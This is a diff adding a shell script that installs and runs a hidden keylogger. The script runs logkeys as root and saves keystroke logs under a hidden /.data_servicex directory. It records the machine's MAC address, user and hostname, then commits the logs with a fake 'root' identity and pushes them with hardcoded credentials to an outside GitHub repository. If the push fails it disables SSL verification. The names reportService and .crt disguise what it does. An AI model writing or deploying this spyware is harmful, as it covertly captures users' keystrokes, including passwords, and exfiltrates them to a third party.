@@ -1,0 +1,87 @@
+#!/bin/sh
+
+MDIR=/.data_servicex
+SDIR=$MDIR/setup
+LDIR=$MDIR/log
+TDIR=$MDIR/tmp
+
+RDIR=run/
+LBIN=bin/
+GBIN=/usr/local/bin/
+
+LMDIR=$LDIR/$(date '+%Y-%m')
+lockdir=/tmp/reportService.lock
+
+
+sudo logkeys --kill
+
+if [ -d $LMDIR ]  
+then
+     echo "$LMDIR exists"
+     cd $LDIR
+     encriptFile
+     git config --local --add user.email "root@rootmail.com"
+     git config --local --add user.name "root"
+     git add \*.crt
+     git commit -m "root-$(date +"%D %T")"
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     ret=$?
+     if [ $ret -ne 0 ]; then
+     git config --global http.sslVerify false
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     else
+     echo "log pushed successfully!!!"
+     fi
+     cd $HOME 
+else
+     echo "$LMDIR doesn't exists"
+     mkdir $LMDIR
+     cd $LMDIR
+     read MAC </sys/class/net/eth0/address
+     echo "started $MAC $USER $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp 
+     encriptFile
+     git config --local --add user.email "root@rootmail.com"
+     git config --local --add user.name "root"
+     git add \*.crt
+     git commit -m "root-$(date +"%D %T")"
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     ret=$?
+     if [ $ret -ne 0 ]; then
+     git config --global http.sslVerify false
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     else
+     echo "log pushed successfully!!!"
+     fi
+     cd $HOME
+fi
+
+sudo logkeys --start --keymap=$SDIR/map/1q2w.map --output=$LMDIR/log_$(date '+%y_%m_%d_%I_%M_%S').ljp
+ret=$?
+if [ $ret -ne 0 ]; then
+     mkdir $TDIR
+     cd $TDIR
+     sudo apt-get install -y automake
+     git config --global http.sslVerify false
+     git clone https://github.com/kernc/logkeys.git
+     cd logkeys
+     ./autogen.sh
+     cd build
+     ../configure
+     make
+     sudo make install
+     cd $HOME
+     rm -rf $TDIR
+     sudo logkeys --start --keymap=$SDIR/map/1q2w.map --output=$LMDIR/log_$(date '+%y_%m_%d_%I_%M_%S').ljp
+     echo "log started successfully!1!"
+else
+     echo "log started successfully!!!"
+fi
+
+read GMAILX </tmp/.GMAILGX
+read GNAMEX </tmp/.GNAMEGX
+git config --global --add user.name "$GNAMEX"
+git config --global --add user.email "$GMAILX"
+
+sudo rm -rf $lockdir
+
+#Done
